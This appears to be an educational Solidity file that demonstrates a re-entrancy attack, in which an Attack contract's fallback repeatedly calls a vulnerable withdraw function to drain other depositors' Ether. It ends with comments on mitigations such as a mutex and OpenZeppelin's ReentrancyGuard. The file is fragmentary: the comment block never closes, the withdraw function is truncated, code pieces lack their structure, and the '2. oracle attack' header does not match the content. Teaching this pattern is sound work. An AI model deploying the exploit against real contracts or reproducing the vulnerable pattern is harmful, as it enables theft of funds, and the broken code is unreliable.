// 2. oracle attack

/*
ReentrantVulnerable is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.
1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).
What happened?
Attack was able to call ReentrantVulnerable.withdraw multiple times before
ReentrantVulnerable.withdraw finished executing.
Here is how the functions were called
- Attack.attack
- ReentrantVulnerable.deposit
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)

        // !
        // At this point, the attacker's contract is called, so is the 'fallback' function.
        // So the 'withdraw' function is called again BEFORE 'balances[msg.sender]' is set to 0.
        // !
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;

    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// * Several ways to prevent this:
// * 1. Update the balance BEFORE sending the money
// * 2. Use mutex, e.g. =>
// bool locked;
// function withdraw() public {
//     require(!locked, 'revert);
//     locked = true;
//     ...
//     locked = false;
// }
// * Which is what openzeppelin does with the ReentrancyGuard & the 'nonReentrant' modifier
